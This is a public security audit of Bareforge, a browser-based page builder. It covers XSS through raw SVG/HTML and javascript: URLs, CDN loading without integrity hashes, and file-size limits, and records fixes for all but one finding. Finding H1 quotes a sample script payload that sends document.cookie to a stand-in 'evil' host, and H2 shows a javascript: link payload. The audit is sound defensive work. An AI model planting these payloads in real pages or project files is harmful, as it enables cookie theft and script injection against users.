# Security audit — Bareforge (2026-04-27)

Threat model: Bareforge is a browser-only ClojureScript app with no
server or auth. Two external trust boundaries matter:

1. **A `.json` project file the user opens** — could be received from a
   third party, hand-edited, or tampered en route.
2. **An exported artefact (HTML / bundle / CLJS / vanilla-JS) that
   the user ships to their audience** — Bareforge users build landing
   pages for *other* people; an XSS that survives export becomes the
   audience's problem, not just the editor's.

## Findings

### H1 — `:inner-html` round-trips raw SVG/HTML, by design — **CLOSED**

| File / line | Detail |
|---|---|
| `src/bareforge/render/reconcile.cljs:87-95` | Editor sets `el.innerHTML = s` directly. |
| `src/bareforge/export/html.cljs:104-106` | HTML export emits `:inner-html` raw, unescaped. |
| `src/bareforge/export/cljs_project/html_to_hiccup.cljs` | CLJS export parses inner HTML into hiccup, but the parser preserves `<script>` and `on*` attrs — so structured construction still ends up running them at insert time (SVG `<script>` and `onclick` execute). |
| `src/bareforge/meta/augment.cljs:1741-1748` | Only `x-icon` opts in via `:raw-html-slot? true`, so the surface is small but real. |

A doc that puts `<script>fetch('//evil/?'+document.cookie)</script>`
or an SVG `<image href="x" onerror="…">` into an x-icon's
`:inner-html` will execute in (a) the editor on load, (b) every
exported artefact except vanilla-JS (which doesn't render
`:inner-html` at all today — see L1).

**Severity:** High for shipped exports. Medium for editor (a user
who opens a malicious file is mostly attacking themselves, but
session cookies / OPFS / IndexedDB content are still exposed).

**Suggested fix:** sanitise `:inner-html` at the load boundary and
on every commit. Either:

- *Allow-list approach* (preferred for x-icon's narrow purpose):
  whitelist SVG element/attr names that are needed for icons —
  `<svg>`, `<path>`, `<g>`, `<circle>`, etc., plus `d`, `fill`,
  `stroke`, `viewBox`, `xmlns` — and drop everything else
  (especially `<script>`, `<foreignObject>`, every `on*` attr,
  every `href`/`xlink:href` whose value matches `^javascript:` or
  `^data:`). Implement once in
  `bareforge.doc.sanitize/sanitize-svg-fragment` and call from
  `validate-project`, `ops/set-inner-html`, and at every codegen
  site.
- *Cheaper interim*: refuse to load a project file whose
  `:inner-html` contains `<script` / `<foreignObject` / `on\w+=`
  via a regex precheck. This isn't airtight (encoded payloads slip
  through), so treat it as defence-in-depth, not the fix.

Add a regression test fixture (`test/fixtures/security/xss-icon.json`)
that asserts the sanitiser strips the payload.

**Resolved**: `bareforge.doc.sanitize` ships `safe-svg-fragment?`
(predicate) and `sanitize-svg-fragment` (stripper) covering
`<script>`, `<foreignObject>`, `<iframe>`, `<object>`, `<embed>`,
`on*=` event attrs, and `javascript:` URLs. `ops/set-inner-html`
runs every commit through it; `storage/project-file/validate-project`
rejects load when `unsafe-findings` returns anything;
`apply-loaded-project!` runs the whole doc through `sanitize-doc`
as defence-in-depth. The vanilla-JS export adds a third sanitise
pass at codegen time.

---

### H2 — `:attrs` accepts `javascript:`-scheme URLs verbatim — **CLOSED**

| File / line | Detail |
|---|---|
| `src/bareforge/render/reconcile.cljs:48-52` | Editor: `setAttribute(k, str v)` with no scheme check. |
| `src/bareforge/export/html.cljs:34-41`, `87` | HTML export's `escape-attr` only escapes `<>"&` — `javascript:alert(1)` survives unchanged. |
| `src/bareforge/export/vanilla_js/renderer.js:71-76` | Vanilla-JS renderer: same `setAttribute(k, String(v))`. |
| `src/bareforge/doc/spec.cljs:17` | Spec is `(s/map-of string? (s/nilable string?))` — content is unconstrained. |

A malicious doc with `:attrs {"href" "javascript:alert(1)"}` on an
`x-link` (or any BareDOM component that proxies `href` through to a
native anchor) executes on click in editor + every export.

**Severity:** Medium. Requires a click on the exported page to fire,
but a passable lure ("Click here to continue") is trivial.

**Suggested fix:** spec-narrow URL-typed attrs, then sanitise at the
load + codegen boundary. Two parts:

1. In `bareforge.meta.augment`, mark every URL-bearing attr (`href`,
   `src`, `xlink:href`, `formaction`, `action`, `background`,
   `poster`, `data` on `<object>`, `cite`) with `:kind :url`. The
   inspector already special-cases known kinds — extend it.
2. Add a `safe-url?` predicate (`bareforge.doc.sanitize/safe-url?`)
   that rejects URLs whose lowercased+trimmed prefix matches
   `javascript:`, `data:` (except `data:image/...`), `vbscript:`, or
   that contain control characters. Call from `validate-project`
   (refuse the load) and from each export's attr emitter (drop the
   attr + log).
3. Tighten `::attrs` spec on URL-marked keys with `safe-url?` so
   future regressions show up as test failures.

**Resolved**: `bareforge.doc.sanitize/safe-url?` implements the
predicate (rejects `javascript:` / `vbscript:` / `livescript:` /
`mocha:`; allows `data:image/...` only); the shared `url-attrs`
set covers `href` / `src` / `xlink:href` / `formaction` /
`action` / `cite` / `poster` / `data` / `background`.
`ops/set-attr` silently drops unsafe URL writes;
`unsafe-findings` flags them at the load boundary. The CSP
`<meta>` block on every export adds a second layer.

---

### H3 — Exported HTML loads BareDOM from CDN with no SRI — **CLOSED**

| File / line | Detail |
|---|---|
| `src/bareforge/export/html.cljs:30, 169` | `https://cdn.jsdelivr.net/npm/@vanelsas/baredom@<version>/dist/...` is dynamically imported with no `integrity=` attribute. |
| `src/bareforge/export/vanilla_js/plugin.cljs:52` | Same pattern in vanilla-JS export. |

If jsDelivr is compromised (or BFP'd via npm tag) every page anyone
ever exported via the **HTML** path fetches whatever the attacker
publishes. Bundle mode self-hosts the JS, so it isn't affected.

**Severity:** Medium-High. Low likelihood, very wide blast-radius.

**Suggested fix (cheapest):** add a CSP `<meta>` to the exported HTML
limiting `script-src` to `'self' https://cdn.jsdelivr.net` and
`object-src 'none'`. CSP doesn't cover the integrity gap but cuts
collateral if other XSS slips through.

**Stronger fix:** during release we already know every BareDOM file
that gets imported. At export time, fetch each module's contents,
hash it (SHA-384), and emit `<link rel="modulepreload" href="…"
integrity="sha384-…" crossorigin>` for each. Then the dynamic
`import()` call uses the preload's hash. This is more work — a
build-time step that does HTTP — and arguably belongs in BareDOM
itself (publish a manifest of `{filename → integrity hash}` per
release; the exporter reads the manifest).

Document the CDN trust assumption in the exporter's docstring
either way — today nothing tells the user.

**Resolved**: `bareforge.export.integrity` parses BareDOM's
`dist/integrity.json` and threads SRI hashes into both HTML and
vanilla-JS exports as `<link rel=modulepreload integrity=…
crossorigin=anonymous>`. BareDOM 2.4.0 (the version Bareforge
now pins) publishes the manifest, so every CDN-mode export
emits SRI bindings automatically. The CSP `<meta>` block remains
in place as defence-in-depth.

---

### M1 — Project file loaded via `cljs.reader/read-string` — **CLOSED**

| File / line | Detail |
|---|---|
| `src/bareforge/storage/indexeddb.cljs:25-35` | `(edn/read-string raw)` on the `.json` payload. |

`cljs.reader/read-string` is genuinely safer than `tools.reader` —
no `#=` eval, no symbol resolution side effects, only registered
tagged-literal handlers fire. So **arbitrary code execution at parse
time is not the risk here.** The risk is *data shape* attacks (which
H1 / H2 already cover) and resource exhaustion from a giant or
deeply-nested input.

**Severity:** Low standalone (covered by H1/H2 mostly).

**Suggested fix:** add a size guard before parsing — refuse files
larger than e.g. 5 MB with a friendly message. The `FileReader`
result is already in memory, but a 100 MB hand-crafted EDN can hang
the spec walker even if the parse succeeds. One-line check at the
top of `open!`'s `onload` handler.

**Resolved**: `storage/project-file/max-file-bytes` is 5 MB;
`open!` rejects oversized files before the FileReader hands the
bytes to the parser, with a user-facing alert explaining the
cap.

---

### M2 — Spec validates shape but not content

| File / line | Detail |
|---|---|
| `src/bareforge/doc/spec.cljs:17, 20, 182-189` | `::attrs`/`::inner-html` are `(s/nilable string?)`; the project-file spec passes any well-typed string. |

This isn't a bug per se — runtime sanitisation is the right layer
for content rules — but the rule set in CLAUDE.md
(`storage/project_file/validate-project`) frames spec validation as
the load-boundary guard. Today that guard accepts XSS payloads
trivially.

**Suggested fix:** after H1+H2 land, add `safe-url?` and
`safe-html?` predicates into the relevant spec keys so the *spec
itself* refuses XSS-shaped values. CLAUDE.md's load-boundary rule
then becomes load-bearing again.

---

### L1 — Vanilla-JS plugin silently drops `:inner-html` — **CLOSED**

| File / line | Detail |
|---|---|
| `src/bareforge/export/vanilla_js/codegen.cljs` | No `:inner-html` handling. The plugin docstring (`plugin.cljs:19`) lists raw-HTML support, but the codegen path doesn't emit it. |

Not exploitable — but a doc that uses x-icon will export to
vanilla-JS missing its icons, which the user discovers only by
running the export. Either implement (and apply H1's sanitiser
before emit) or document the gap and throw `(:error :nyi)` when an
x-icon node has `:inner-html` content.

**Resolved:** the parser was promoted from `cljs_project/` to a
shared `bareforge.export.html-to-hiccup` ns, with a public
`parse-html` that returns hiccup data. The vanilla-JS codegen now
calls it for any node with `:inner-html`, runs the result through
`sanitize-svg-fragment` first as defence-in-depth, and emits the
parsed tree as nested JS hiccup — same path the renderer already
walks for any other child. No `__html` sentinel, no `innerHTML`
write, no runtime parser. The `assert-supported!` NYI gate dropped
the `:inner-html` branch.

---

### L2 — Editor's reconciler trusts the document fully

The editor's `reconcile/apply-attrs!` and `set-inner-html!` apply
whatever's in the doc map. The doc reaches them via two paths: user
edits in the inspector (low risk — same-origin self-attack), and
`apply-loaded-project!` (the H1/H2 vector). The fix in H1/H2
sanitises at the boundary, after which the editor's trust is
justified. No separate fix needed if H1+H2 land.

---

## Quick wins that don't require new code

- The exported HTML has no `<meta http-equiv="Content-Security-Policy">`
  block. Adding one with `default-src 'self'; script-src 'self'
  https://cdn.jsdelivr.net; object-src 'none'; base-uri 'self'` is a
  one-line edit in `html.cljs` `render-html` and an immediate
  hardening regardless of whether H3's stronger fix lands.
- Bundle export self-hosts BareDOM but has no CSP either. Same
  one-line addition, narrower (`script-src 'self'`).
- `download.cljs` paths inside the JSZip are constructed from group
  names. If a group name contains `..` segments or path separators,
  the zip can write outside its intended dir at extract time. Worth
  a glance — zip-slip is a classic. (Likely already safe via
  `name->ns-segment` normalisation, but verify.)

---

## What's NOT broken

Surveyed and found clean:

- **No `eval` / `Function(...)` / `document.write`** anywhere in
  `src/`. Verified via grep.
- **`cljs.reader/read-string`** does not run reader-eval forms, so
  no RCE at parse time.
- **`escape-text` / `escape-attr` / `escape-cljs-str`** are correct
  for their scope (HTML body / quoted attr / CLJS source string).
  The gap is what they don't try to do — URL-scheme filtering — not
  bugs in what they do.
- **`add-watch` / event handlers** all close over typed bindings;
  no string-eval handlers.
- **Vanilla-JS renderer text path** uses `createTextNode`, not
  `innerHTML`. Safe.
- **No mixed-content** in exports — CDN is HTTPS.

---

## Suggested priority order

1. **H2** — URL-scheme sanitiser. Smallest fix, blocks the most
   plausible attack (a click-bait `href="javascript:..."`).
2. **H1** — `:inner-html` sanitiser, narrow allow-list for SVG.
   Fixes the editor + HTML/CLJS exports together.
3. **CSP `<meta>` block** in HTML and bundle exports — quick win,
   ships defence-in-depth even before H1/H2 land.
4. **M1** — file-size guard on project-file load. One line.
5. **L1** — decide vanilla-JS `:inner-html` (implement-with-sanitiser
   or `:nyi`-throw).
6. **H3 stronger fix** (SRI + integrity manifest) — biggest lift,
   ideally driven from a BareDOM-side change so every consumer
   benefits.

Each of 1, 2, 4 is a single PR; 3 is a one-liner; 5 is opinion-
gated; 6 is upstream work.

---

## Status as of 2026-04-27

| Item | Status | Notes |
|---|---|---|
| **H1** | **CLOSED** | `bareforge.doc.sanitize` + sanitise-on-commit + sanitise-on-load + sanitise-on-codegen. |
| **H2** | **CLOSED** | `safe-url?` predicate + `url-attrs` set; `ops/set-attr` drops unsafe writes; load boundary refuses. |
| **H3** | **CLOSED** | SRI consumer reads BareDOM's published `dist/integrity.json`; every CDN-mode export emits `<link rel=modulepreload integrity=…>` bindings. |
| **M1** | **CLOSED** | 5 MB cap in `storage/project-file/max-file-bytes`. |
| **M2** | **OPEN** (deferred) | Spec content tightening would push the H1/H2 predicates into `clojure.spec`. The runtime sanitiser carries the contract today; making it spec-level is a polish item without a known incident driving it. |
| **L1** | **CLOSED** | Vanilla-JS `:inner-html` parses to nested hiccup at codegen via `bareforge.export.html-to-hiccup`. |
| **L2** | **CLOSED** (by H1+H2) | Reconciler trust is now justified — H1 and H2 sanitise at the boundary, so the reconciler reads pre-sanitised values. |

The audit remains in the public repo as a transparency signal:
findings, fixes, and references in one place. New advisories will
land here alongside the corresponding `CHANGELOG.md` entry.
